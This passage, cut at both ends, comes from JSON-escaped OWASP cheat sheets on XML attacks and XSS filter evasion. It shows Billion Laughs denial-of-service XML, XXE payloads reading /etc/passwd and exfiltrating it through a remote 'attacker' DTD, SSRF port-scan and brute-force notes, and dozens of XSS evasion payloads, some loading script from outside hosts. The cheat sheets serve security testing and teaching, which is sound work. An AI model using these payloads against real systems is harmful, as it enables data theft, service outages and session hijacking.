&A;'s)...&A;&A;&A;&A;&A;</root>\r\n```\r\n\r\n#### Billion Laughs\r\n\r\nWhen an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema including the attack:\r\n\r\n```xml\r\n<!DOCTYPE root [\r\n <!ELEMENT root ANY>\r\n <!ENTITY LOL \"LOL\">\r\n <!ENTITY LOL1 \"&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;\">\r\n <!ENTITY LOL2 \"&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;\">\r\n <!ENTITY LOL3 \"&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;\">\r\n <!ENTITY LOL4 \"&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;\">\r\n <!ENTITY LOL5 \"&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;\">\r\n <!ENTITY LOL6 \"&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;\">\r\n <!ENTITY LOL7 \"&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;\">\r\n <!ENTITY LOL8 \"&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;\">\r\n <!ENTITY LOL9 \"&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;\">\r\n]>\r\n<root>&LOL9;</root>\r\n```\r\n\r\nThe entity `LOL9` will be resolved as the 10 entities defined in `LOL8`; then each of these entities will be resolved in `LOL7` and so on. Finally, the CPU and/or memory will be affected by parsing the `3 x 10^9` (3,000,000,000) entities defined in this schema, which could make the parser crash.\r\n\r\nThe Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) specification forbids [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)s completely. This means that a SOAP processor can reject any SOAP message that contains a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Despite this specification, certain SOAP implementations did parse [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schemas within SOAP messages.\r\n\r\nThe following example illustrates a case where the parser is not following the specification, enabling a reference to a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) in a SOAP message:\r\n\r\n```xml\r\n<?XML VERSION=\"1.0\" ENCODING=\"UTF-8\"?>\r\n<!DOCTYPE SOAP-ENV:ENVELOPE [\r\n <!ELEMENT SOAP-ENV:ENVELOPE ANY>\r\n <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>\r\n <!ENTITY LOL \"LOL\">\r\n <!ENTITY LOL1 \"&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;\">\r\n <!ENTITY LOL2 \"&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;\">\r\n <!ENTITY LOL3 \"&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;\">\r\n <!ENTITY LOL4 \"&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;\">\r\n <!ENTITY LOL5 \"&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;\">\r\n <!ENTITY LOL6 \"&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;\">\r\n <!ENTITY LOL7 \"&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;\">\r\n <!ENTITY LOL8 \"&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;\">\r\n <!ENTITY LOL9 \"&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;\">\r\n]>\r\n<SOAP:ENVELOPE ENTITYREFERENCE=\"&LOL9;\"\r\n               XMLNS:SOAP=\"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/\">\r\n <SOAP:BODY>\r\n  <KEYWORD XMLNS=\"URN:PARASOFT:WS:STORE\">FOO</KEYWORD>\r\n </SOAP:BODY>\r\n</SOAP:ENVELOPE>\r\n```\r\n\r\n#### Reflected File Retrieval\r\n\r\nConsider the following example code of an XXE:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n<!DOCTYPE root [\r\n <!ELEMENT includeme ANY>\r\n <!ENTITY xxe SYSTEM \"/etc/passwd\">\r\n]>\r\n<root>&xxe;</root>\r\n```\r\n\r\nThe previous XML defines an entity named `xxe`, which is in fact the contents of `/etc/passwd`, which will be expanded within the `includeme` tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.\r\n\r\n#### Server Side Request Forgery\r\n\r\nServer Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.\r\n\r\n##### External DNS Resolution\r\n\r\nSometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.\r\n\r\n```xml\r\n<!DOCTYPE m PUBLIC \"-//B/A/EN\" \"http://checkforthisspecificdomain.example.com\">\r\n```\r\n\r\n##### External Connection\r\n\r\nWhenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE root [\r\n <!ENTITY % xxe SYSTEM \"http://attacker/evil.dtd\">\r\n %xxe;\r\n]>\r\n```\r\n\r\n##### File Retrieval with Parameter Entities\r\n\r\nParameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<!DOCTYPE root [\r\n <!ENTITY % file SYSTEM \"file:///etc/passwd\">\r\n <!ENTITY % dtd SYSTEM \"http://attacker/evil.dtd\">\r\n %dtd;\r\n]>\r\n<root>&send;</root>\r\n```\r\n\r\nHere the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two external parameter entities: `file` loads a local file, and `dtd` which loads a remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). The remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) should contain something like this:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://example.com/?%file;'>\">\r\n%all;\r\n```\r\n\r\nThe second [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) causes the system to send the contents of the `file` back to the attacker's server as a parameter of the URL.\r\n\r\n##### Port Scanning\r\n\r\nThe amount and type of information will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:\r\n\r\n**1) Complete Disclosure**: The simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.\r\n\r\n**2) Error-based**: If you are unable to see the response from the remote server, you may be able to use the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:\r\n\r\n```text\r\njava.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80\r\n at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)\r\n at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)\r\n```\r\n\r\n**3) Timeout-based**: Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.\r\n\r\n**4) Time-based**: Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks.\r\n\r\n##### Brute Forcing\r\n\r\nOnce an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the `username` and `password` as part of the URI scheme (http, ftp, etc). For example the following :\r\n\r\n```xml\r\n<!DOCTYPE root [\r\n <!ENTITY user SYSTEM \"http://username:password@example.com:8080\">\r\n]>\r\n<root>&user;</root>\r\n```\r\n"
    },
    {
      "XSS_Filter_Evasion_Cheat_Sheet.md": "# XSS Filter Evasion Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article is focused on providing application security testing professionals with a guide to assist in Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS Cheat Sheet, which was at: `http://ha.ckers.org/xss.html`. That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention Cheat Sheet, the [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake's XSS Cheat Sheet, so we can thank RSnake for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack cheat sheet, and so the [OWASP Cheat Sheet Series](https://owasp.org/www-project-cheat-sheets/) was born.\r\n\r\n## Tests\r\n\r\nThis cheat sheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate.\r\n\r\n### Basic XSS Test Without Filter Evasion\r\n\r\nThis is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):\r\n\r\n`<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`\r\n\r\n### XSS Locator (Polyglot)\r\n\r\nThe following is a \"polyglot test XSS payload.\" This test will execute in multiple contexts including html, script string, js and URL. (Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).\r\n\r\n```\r\njavascript:/*--></title></style></textarea></script></xmp>\r\n<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>\r\n```\r\n\r\n### Malformed A Tags\r\n\r\nSkip the HREF attribute and get to the meat of the XXS... Submitted by David Cross \\~ Verified on Chrome\r\n\r\n`\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>`\r\n\r\nor Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script.\r\n\r\n`\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>`\r\n\r\n### Malformed IMG Tags\r\n\r\nOriginally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags:\r\n\r\n`<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>`\r\n\r\n### fromCharCode\r\n\r\nIf no quotes of any kind are allowed you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:\r\n\r\n`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`\r\n\r\n### Default SRC Tag to Get Past Filters that Check SRC Domain\r\n\r\nThis will bypass most SRC domain filters. Inserting JavaScript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like `onblur`, `onclick` giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .\r\n\r\nEdited by Abdullah Hussam(@Abdulahhusam).\r\n\r\n`<IMG SRC=# onmouseover=\"alert('xxs')\">`\r\n\r\n### Default SRC Tag by Leaving it Empty\r\n\r\n`<IMG SRC= onmouseover=\"alert('xxs')\">`\r\n\r\n### Default SRC Tag by Leaving it out Entirely\r\n\r\n`<IMG onmouseover=\"alert('xxs')\">`\r\n\r\n### On Error Alert\r\n\r\n`<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>`\r\n\r\n### IMG onerror and JavaScript Alert Encode\r\n\r\n`<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">`\r\n\r\n### Decimal HTML Character References\r\n\r\nAll of the XSS examples that use a javascript: directive inside of an `<IMG` tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).\r\n\r\n`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`\r\n\r\n### Decimal HTML Character References Without Trailing Semicolons\r\n\r\nThis is often effective in XSS that attempts to look for \"&\\#XX;\", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/; which incorrectly assumes a semicolon is required to terminate a HTML encoded string (I've seen this in the wild):\r\n\r\n`<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`\r\n\r\n### Hexadecimal HTML Character References Without Trailing Semicolons\r\n\r\nThis is also a viable XSS attack against the above string $tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).\r\n\r\n`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`\r\n\r\n### Embedded Tab\r\n\r\nUsed to break up the cross site scripting attack:\r\n\r\n<!-- markdownlint-disable MD010-->\r\n`<IMG SRC=\"jav\tascript:alert('XSS');\">`\r\n<!-- markdownlint-enable MD010-->\r\n\r\n### Embedded Encoded Tab\r\n\r\nUse this one to break up XSS :\r\n\r\n`<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">`\r\n\r\n### Embedded Newline to Break-up XSS\r\n\r\nSome websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:\r\n\r\n`<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">`\r\n\r\n### Embedded Carriage Return to Break-up XSS\r\n\r\n(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):\r\n\r\n`<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">`\r\n\r\n### Null breaks up JavaScript Directive\r\n\r\nNull chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:\r\n\r\n`perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out`\r\n\r\n### Spaces and Meta Chars Before the JavaScript in Images for XSS\r\n\r\nThis is useful if the pattern match doesn't take into account spaces in the word `javascript:` -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:\r\n\r\n`<IMG SRC=\" &#14;  javascript:alert('XSS');\">`\r\n\r\n### Non-alpha-non-digit XSS\r\n\r\nThe Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\\<SCRIPT\\\\s` != `\\<SCRIPT/XSS\\\\s`:\r\n\r\n`<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\nBased on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:\r\n\r\n````\r\n<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\r\n````\r\n\r\nYair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.\r\n\r\n`<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\n### Extraneous Open Brackets\r\n\r\nSubmitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorithm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:\r\n\r\n`<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>`\r\n\r\n### No Closing Script Tags\r\n\r\nIn Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the `\\></SCRIPT>` portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful\\! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:\r\n\r\n`<SCRIPT SRC=http://xss.rocks/xss.js?< B >`\r\n\r\n### Protocol Resolution in Script Tags\r\n\r\nThis particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a `</SCRIPT>` tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The \".j\" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.\r\n\r\n`<SCRIPT SRC=//xss.rocks/.j>`\r\n\r\n### Half Open HTML/JavaScript XSS Vector\r\n\r\nUnlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close \"\\>\" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: `/((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/` because it doesn't require the end \"\\>\". As a side note, this was also affective against a real world XSS filter I came across using an open ended `<IFRAME` tag instead of an `<IMG` tag:\r\n\r\n`<IMG SRC=\"`<javascript:alert>`('XSS')\"`\r\n\r\n### Double Open Angle Brackets\r\n\r\nUsing an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:\r\n\r\n`<iframe src=http://xss.rocks/scriptlet.html <`\r\n\r\n### Escaping JavaScript Escapes\r\n\r\nWhen the application is written to output some user information inside of a JavaScript like the following: `<SCRIPT>var a=\"$ENV{QUERY\\_STRING}\";</SCRIPT>` and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read `<SCRIPT>var a=\"\\\\\\\\\";alert('XSS');//\";</SCRIPT>` which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:\r\n\r\n`\\\";alert('XSS');//`\r\n\r\nAn alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:\r\n\r\n`</script><script>alert('XSS');</script>`\r\n\r\n### End Title Tag\r\n\r\nThis is a simple XSS vector that closes `<TITLE>` tags, which can encapsulate the malicious cross site scripting attack:\r\n\r\n`</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>`\r\n\r\n### INPUT Image\r\n\r\n`<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">`\r\n\r\n### BODY Image\r\n\r\n`<BODY BACKGROUND=\"javascript:alert('XSS')\">`\r\n\r\n### IMG Dynsrc\r\n\r\n`<IMG DYNSRC=\"javascript:alert('XSS')\">`\r\n\r\n### IMG Lowsrc\r\n\r\n`<IMG LOWSRC=\"javascript:alert('XSS')\">`\r\n\r\n### List-style-image\r\n\r\nFairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:\r\n\r\n`<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>`\r\n\r\n### VBscript in an Image\r\n\r\n`<IMG SRC='vbscript:msgbox(\"XSS\")'>`\r\n\r\n### Livescript (older versions of Netscape only)\r\n\r\n`<IMG SRC=\"livescript:[code]\">`\r\n\r\n### SVG Object Tag\r\n\r\n`<svg/onload=alert('XSS')>`\r\n\r\n### ECMAScript 6\r\n\r\n```\r\nSet.constructor`alert\\x28document.domain\\x29\r\n```\r\n\r\n### BODY Tag\r\n\r\nMethod doesn't require using any variants of `javascript:` or `<SCRIPT...` to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign (`onload=` != `onload =`):\r\n\r\n`<BODY ONLOAD=alert('XSS')>`\r\n\r\n### Event Handlers\r\n\r\nIt can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.\r\n\r\nThe [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).\r\n\r\n1. `FSCommand()` (attacker can use this when executed from within an embedded Flash object)\r\n2. `onAbort()` (when user aborts the loading of an image)\r\n3. `onActivate()` (when object is set as the active element)\r\n4. `onAfterPrint()` (activates after user prints or previews print job)\r\n5. `onAfterUpdate()` (activates on data object after updating data in the source object)\r\n6. `onBeforeActivate()` (fires before the object is set as the active element)\r\n7. `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand(\"Copy\")` function)\r\n8. `onBeforeCut()` (attacker executes the attack string right before a selection is cut)\r\n9. `onBeforeDeactivate()` (fires right after the activeElement is changed from the current object)\r\n10. `onBeforeEditFocus()` (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)\r\n11. `onBeforePaste()` (user needs to be tricked into pasting or be forced into it using the `execCommand(\"Paste\")` function)\r\n12. `onBeforePrint()` (user would need to be tricked into printing or attacker could use the `print()` or `execCommand(\"Print\")` function).\r\n13. `onBeforeUnload()` (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)\r\n14. `onBeforeUpdate()` (activates on data object before updating data in the source object)\r\n15. `onBegin()` (the onbegin event fires immediately when the element's timeline begins)\r\n16. `onBlur()` (in the case where another popup is loaded and window looses focus)\r\n17. `onBounce()` (fires when the behavior property of the marquee object is set to \"alternate\" and the contents of the marquee reach one side of the window)\r\n18. `onCellChange()` (fires when data changes in the data provider)\r\n19. `onChange()` (select, text, or TEXTAREA field loses focus and its value has been modified)\r\n20. `onClick()` (someone clicks on a form)\r\n21. `onContextMenu()` (user would need to right click on attack area)\r\n22. `onControlSelect()` (fires when the user is about to make a control selection of the object)\r\n23. `onCopy()` (user needs to copy something or it can be exploited using the `execCommand(\"Copy\")` command)\r\n24. `onCut()` (user needs to copy something or it can be exploited using the `execCommand(\"Cut\")` command)\r\n25. `onDataAvailable()` (user would need to change data in an element, or attacker could perform the same function)\r\n26. `onDataSetChanged()` (fires when the data set exposed by a data source object changes)\r\n27. `onDataSetComplete()` (fires to indicate that all data is available from the data source object)\r\n28. `onDblClick()` (user double-clicks a form element or a link)\r\n29. `onDeactivate()` (fires when the activeElement is changed from the current object to another object in the parent document)\r\n30. `onDrag()` (requires that the user drags an object)\r\n31. `onDragEnd()` (requires that the user drags an object)\r\n32. `onDragLeave()` (requires that the user drags an object off a valid location)\r\n33. `onDragEnter()` (requires that the user drags an object into a valid location)\r\n34. `onDragOver()` (requires that the user drags an object into a valid location)\r\n35. `onDragDrop()` (user drops an object (e.g. file) onto the browser window)\r\n36. `onDragStart()` (occurs when user starts drag operation)\r\n37. `onDrop()` (user drops an object (e.g. file) onto the browser window)\r\n38. `onEnd()` (the onEnd event fires when the timeline ends.\r\n39. `onError()` (loading of a document or image causes an error)\r\n40. `onErrorUpdate()` (fires on a databound object when an error occurs while updating the associated data in the data source object)\r\n41. `onFilterChange()` (fires when a visual filter completes state change)\r\n42. `onFinish()` (attacker can create the exploit when marquee is finished looping)\r\n43. `onFocus()` (attacker executes the attack string when the window gets focus)\r\n44. `onFocusIn()` (attacker executes the attack string when window gets focus)\r\n45. `onFocusOut()` (attacker executes the attack string when window looses focus)\r\n46. `onHashChange()` (fires when the fragment identifier part of the document's current address changed)\r\n47. `onHelp()` (attacker executes the attack string when users hits F1 while the window is in focus)\r\n48. `onInput()` (the text content of an element is changed through the user interface)\r\n49. `onKeyDown()` (user depresses a key)\r\n50. `onKeyPress()` (user presses or holds down a key)\r\n51. `onKeyUp()` (user releases a key)\r\n52. `onLayoutComplete()` (user would have to print or print preview)\r\n53. `onLoad()` (attacker executes the attack string after the window loads)\r\n54. `onLoseCapture()` (can be exploited by the `releaseCapture()` method)\r\n55. `onMediaComplete()` (When a streaming media file is used, this event could fire before the file starts playing)\r\n56. `onMediaError()` (User opens a page in the browser that contains a media file, and the event fires when there is a problem)\r\n57. `onMessage()` (fire when the document received a message)\r\n58. `onMouseDown()` (the attacker would need to get the user to click on an image)\r\n59. `onMouseEnter()` (cursor moves over an object or area)\r\n60. `onMouseLeave()` (the attacker would need to get the user to mouse over an image or table and then off again)\r\n61. `onMouseMove()` (the attacker would need to get the user to mouse over an image or table)\r\n62. `onMouseOut()` (the attacker would need to get the user to mouse over an image or table and then off again)\r\n63. `onMouseOver()` (cursor moves over an object or area)\r\n64. `onMouseUp()` (the attacker would need to get the user to click on an image)\r\n65. `onMouseWheel()` (the attacker would need to get the user to use their mouse wheel)\r\n66. `onMove()` (user or attacker would move the page)\r\n67. `onMoveEnd()` (user or attacker would move the page)\r\n68. `onMoveStart()` (user or attacker would move the page)\r\n69. `onOffline()` (occurs if the browser is working in online mode and it starts to work offline)\r\n70. `onOnline()` (occurs if the browser is working in offline mode and it starts to work online)\r\n71. `onOutOfSync()` (interrupt the element's ability to play its media as defined by the timeline)\r\n72. `onPaste()` (user would need to paste or attacker could use the `execCommand(\"Paste\")` function)\r\n73. `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)\r\n74. `onPopState()` (fires when user navigated the session history)\r\n75. `onProgress()` (attacker would use this as a flash movie was loading)\r\n76. `onPropertyChange()` (user or attacker would need to change an element property)\r\n77. `onReadyStateChange()` (user or attacker would need to change an element property)\r\n78. `onRedo()` (user went forward in undo transaction history)\r\n79. `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)\r\n80. `onReset()` (user or attacker resets a form)\r\n81. `onResize()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)\r\n82. `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)\r\n83. `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)\r\n84. `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)\r\n85. `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)\r\n86. `onRowsEnter()` (user or attacker would need to change a row in a data source)\r\n87. `onRowExit()` (user or attacker would need to change a row in a data source)\r\n88. `onRowDelete()` (user or attacker would need to delete a row in a data source)\r\n89. `onRowInserted()` (user or attacker would need to insert a row in a data source)\r\n90. `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)\r\n91. `onSeek()` (the onreverse event fires when the timeline is set to play in any direction other than forward)\r\n92. `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand(\"SelectAll\");`)\r\n93. `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand(\"SelectAll\");`)\r\n94. `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand(\"SelectAll\");`)\r\n95. `onStart()` (fires at the beginning of each marquee loop)\r\n96. `onStop()` (user would need to press the stop button or leave the webpage)\r\n97. `onStorage()` (storage area changed)\r\n98. `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)\r\n99. `onSubmit()` (requires attacker or user submits a form)\r\n100. `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)\r\n101. `onTrackChange()` (user or attacker changes track in a 